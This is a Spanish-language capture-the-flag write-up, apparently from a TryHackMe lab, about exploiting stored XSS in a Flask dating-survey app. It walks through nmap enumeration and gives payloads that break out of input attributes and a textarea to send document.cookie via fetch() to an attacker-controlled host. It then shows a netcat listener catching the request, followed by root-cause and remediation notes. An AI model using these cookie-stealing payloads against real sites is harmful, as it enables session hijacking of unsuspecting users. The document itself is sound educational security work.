## Enumeracion
Empiezo haciendo un ping para deducir con el TTL que SO usa.
`ping -c 1 vmip`
`64 bytes from vmip: icmp_seq=1 ttl=62 time=28.1 ms`

Lo mas probable es que sea linux o mac.
`http://vmip:5000`
Sigo con nmap para saber que puertos tiene abiertos.
`nmap -sVC vmip`
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 5b:a0:cd:29:ac:b9:ab:c9:f3:c9:87:7f:15:e7:0f:0e (ECDSA)
|_  256 f6:ef:87:0c:94:8b:7f:81:f2:92:c7:a1:d5:01:62:46 (ED25519)
631/tcp  open  ipp     CUPS 2.4
|_http-title: Forbidden - CUPS v2.4.12
|_http-server-header: CUPS/2.4 IPP/2.1
5000/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.12.3)
|_http-server-header: Werkzeug/3.0.1 Python/3.12.3
|_http-title: Cupid's Matchmaker
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Veo que tiene un servidor CUPS en el puerto 631 y una web python en el 5000.
Voy a investigar el servidor web ya que es el mas interesante.

## Analisis puerto 5000

Empiezo entrando a la web.
Y veo que tiene una encuesta para encontrar pareja en la que es revisada por humanos.
Sabiendo eso veo una oportunidad para explotar un XSS.

Hago un `curl` a la parte de la pagina de las encuestas.
`curl http://vmip:5000/survey`
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Personality Survey - Cupid's Matchmaker</title>
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <nav class="navbar">
        <div class="container">
            <a href="/" class="logo">
                <span class="heart">💘</span> Cupid's Matchmaker
            </a>
            <div class="nav-links">
                <a href="/">Home</a>
                <a href="/survey" class="btn-primary">Take Survey</a>
                
            </div>
        </div>
    </nav>

    
        
    

    <main>
        
<div class="survey-page">
    <div class="container">
        <div class="survey-header">
            <h1>Find Your Perfect Match</h1>
            <p>Our matchmaking team will personally review your answers to find you someone special. Be honest and detailed - the more we know, the better we can match you! ❤️</p>
        </div>

        <form method="POST" class="survey-form">
            <div class="form-section">
                <h2>About You</h2>
                
                <div class="form-group">
                    <label for="name">Name <span class="required">*</span></label>
                    <input type="text" id="name" name="name" required placeholder="Your first name">
                </div>

                <div class="form-row">
                    <div class="form-group">
                        <label for="age">Age <span class="required">*</span></label>
                        <input type="number" id="age" name="age" required min="18" max="100" placeholder="25">
                    </div>

                    <div class="form-group">
                        <label for="gender">Gender <span class="required">*</span></label>
                        <select id="gender" name="gender" required>
                            <option value="">Select...</option>
                            <option value="Male">Male</option>
                            <option value="Female">Female</option>
                            <option value="Non-binary">Non-binary</option>
                            <option value="Prefer not to say">Prefer not to say</option>
                        </select>
                    </div>

                    <div class="form-group">
                        <label for="seeking">Seeking <span class="required">*</span></label>
                        <select id="seeking" name="seeking" required>
                            <option value="">Select...</option>
                            <option value="Male">Male</option>
                            <option value="Female">Female</option>
                            <option value="Non-binary">Non-binary</option>
                            <option value="Any">Any</option>
                        </select>
                    </div>
                </div>
            </div>

            <div class="form-section">
                <h2>Get to Know You</h2>
                
                <div class="form-group">
                    <label for="ideal_date">What's your idea of a perfect Valentine's Day date? <span class="required">*</span></label>
                    <textarea id="ideal_date" name="ideal_date" required rows="4" placeholder="Describe your dream Valentine's Day date in detail..."></textarea>
                    <small>Our team reads every word! Be creative and specific.</small>
                </div>

                <div class="form-group">
                    <label for="describe_yourself">Describe yourself in 3-5 words <span class="required">*</span></label>
                    <input type="text" id="describe_yourself" name="describe_yourself" required placeholder="e.g., Adventurous, Kind, Witty, Creative">
                </div>

                <div class="form-group">
                    <label for="looking_for">What are you looking for in a partner? <span class="required">*</span></label>
                    <textarea id="looking_for" name="looking_for" required rows="4" placeholder="Tell us about your ideal partner - personality, interests, values..."></textarea>
                    <small>The more detail you provide, the better we can match you!</small>
                </div>

                <div class="form-group">
                    <label for="dealbreakers">Any dealbreakers or things to avoid?</label>
                    <textarea id="dealbreakers" name="dealbreakers" rows="3" placeholder="Optional: Things that are important to avoid in a match..."></textarea>
                </div>
            </div>

            <div class="form-actions">
                <button type="submit" class="btn-submit">Submit Survey 💘</button>
            </div>

            <div class="form-note">
                <p>🔒 Your information is confidential and will only be used for matchmaking purposes.</p>
                <p>📋 Our team typically reviews submissions within a minute.</p>
            </div>
        </form>
    </div>
</div>

    </main>

    <footer>
        <div class="container">
            <p>&copy; 2026 Cupid's Matchmaker | No AI, Just Love ❤️</p>
        </div>
    </footer>
</body>
</html> 
```

Veo que tiene varios `textarea` e `input` en el que se pueda explotar el XSS escapando del atributo facilmente.
## Explotacion

Voy a usar un payload que recoja las cookies de la victima y me las pase a mi.

Payload inputs:
`"><script>fetch('http://TU_IP:PUERTO/?c='+document.cookie)</script>`

Payload textarea:
`</textarea><script>fetch('http://TU_IP:PUERTO/?c='+document.cookie)</script>`


Pongo el listener en el puerto `4444`.
`nc -nlvp 4444`

Me pongo a rellenar el formulario con todos los payloads que pueda y lo mando.
### Obtencion de flag
Y al mandarlo recibo una respuesta con la flag:
```
connect to [vmip] from (UNKNOWN) [atckip] 50368
GET /?c=flag=THM{FLAG} HTTP/1.1
Host: vmip:PORT
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/144.0.0.0 Safari/537.36
Accept: */*
Origin: http://localhost:5000
Referer: http://localhost:5000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9


```

## Causa raiz
El XSS se ejecuta ya que en el primer caso escapa del atributo con `">` y en el otro sale del textarea con `</textarea>` y como sale de la etiqueta o del atributo eso es lo que permite que el codigo de JavaScript se ejecute. Esto solo es posible porque la aplicacion no esta escapando el input del usuario antes de insertarlo en el HTML.
## Remediacion
Esto con la flag `HttpOnly` hubiera reducido las posibilidades ya que impide que las cookies sean modificadas o leidas por un script de JavaScript del navegador.